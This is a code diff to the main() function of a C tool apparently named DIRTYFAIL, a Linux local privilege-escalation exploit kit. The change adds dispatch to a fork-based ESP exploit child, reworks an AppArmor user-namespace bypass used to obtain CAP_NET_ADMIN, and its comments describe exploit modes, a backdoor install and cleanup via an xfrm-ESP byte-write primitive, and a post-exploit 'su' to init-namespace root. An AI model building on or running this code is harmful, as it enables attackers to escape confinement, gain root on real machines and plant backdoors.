@@ -114,14 +114,30 @@ enum mode {
 int main(int argc, char **argv)
 {
     /* If we're a re-exec from the apparmor bypass dance, route to the
-     * stage handler immediately. It either re-execs again (stage 1) or
-     * returns rewritten argv with us inside a fresh userns (stage 2). */
+     * stage handler immediately. Stage 1 re-execs to stage 2; stage 2
+     * unshares + raises caps, then either:
+     *   (a) DIRTYFAIL_INNER_MODE is set → we're a fork-based exploit
+     *       child. Dispatch to the inner handler and exit. Parent
+     *       (init ns) reaps us and continues with verify + su.
+     *   (b) Not set → legacy `--aa-bypass` whole-process mode; fall
+     *       through to the normal main() flow with rewritten argv. */
     if (apparmor_bypass_is_stage(argc, argv)) {
         int new_argc = argc;
         char **new_argv = argv;
         if (apparmor_bypass_run_stage(argc, argv, &new_argc, &new_argv) != 0) {
             fprintf(stderr, "apparmor bypass stage failed\n");
             return 1;
+        }
+        const char *inner = getenv("DIRTYFAIL_INNER_MODE");
+        if (inner && *inner) {
+            df_result_t r = DF_TEST_ERROR;
+            if (strcmp(inner, "esp") == 0) {
+                r = dirtyfrag_esp_exploit_inner();
+            } else {
+                fprintf(stderr, "unknown DIRTYFAIL_INNER_MODE: %s\n", inner);
+                r = DF_TEST_ERROR;
+            }
+            return (int)r;
         }
         argc = new_argc;
         argv = new_argv;
@@ -183,25 +199,20 @@ int main(int argc, char **argv)
     if (m == MODE_HELP)    { usage(argv[0]); return 0; }
     if (m == MODE_VERSION) { puts("DIRTYFAIL " DIRTYFAIL_VERSION); return 0; }
 
-    /* For exploit modes that need a fresh user namespace (esp/esp6/rxrpc),
-     * autodetect the AppArmor restriction and arm the bypass — unless
-     * the user explicitly requested it (or opted out). */
-    /* MODE_CLEANUP_BACKDOOR also needs the userns: it calls
-     * cfg_1byte_write to revert each byte via the same xfrm-ESP
-     * primitive used during install, which requires CAP_NET_ADMIN. */
-    bool needs_userns = (m == MODE_EXPLOIT_ESP      || m == MODE_EXPLOIT_ESP6  ||
-                         m == MODE_EXPLOIT_RXRPC    || m == MODE_EXPLOIT_GCM   ||
-                         m == MODE_EXPLOIT_BACKDOOR || m == MODE_CLEANUP_BACKDOOR);
-    if (aa_bypass || (needs_userns && apparmor_bypass_needed())) {
-        if (!aa_bypass) {
-            log_warn("AppArmor restricted profile detected — arming bypass");
-            log_hint("(suppress with --no-aa-bypass once that flag exists)");
-        }
+    /* Exploit modes now do their OWN fork-based AA bypass internally
+     * (parent stays in init ns for the post-exploit `su` to drop into
+     * REAL init-ns root). We only arm the legacy whole-process bypass
+     * when the operator explicitly requests it via --aa-bypass — that
+     * path is mostly useful for debugging the bypass mechanics in
+     * isolation, not for actual exploitation. */
+    if (aa_bypass) {
+        log_warn("--aa-bypass: arming legacy whole-process bypass");
+        log_hint("note: exploit modes now do their own fork-based bypass; "
+                 "this flag is for debugging only and may break su afterwards.");
         if (apparmor_bypass_arm_and_relaunch(argc, argv) != 0) {
             log_warn("apparmor bypass failed (%s) — continuing un-bypassed",
                      strerror(errno));
         }
-        /* On success, execv replaced our image; control never returns here. */
     }
 
     if (dirtyfail_use_color) fputs("\033[1;35m", stdout);
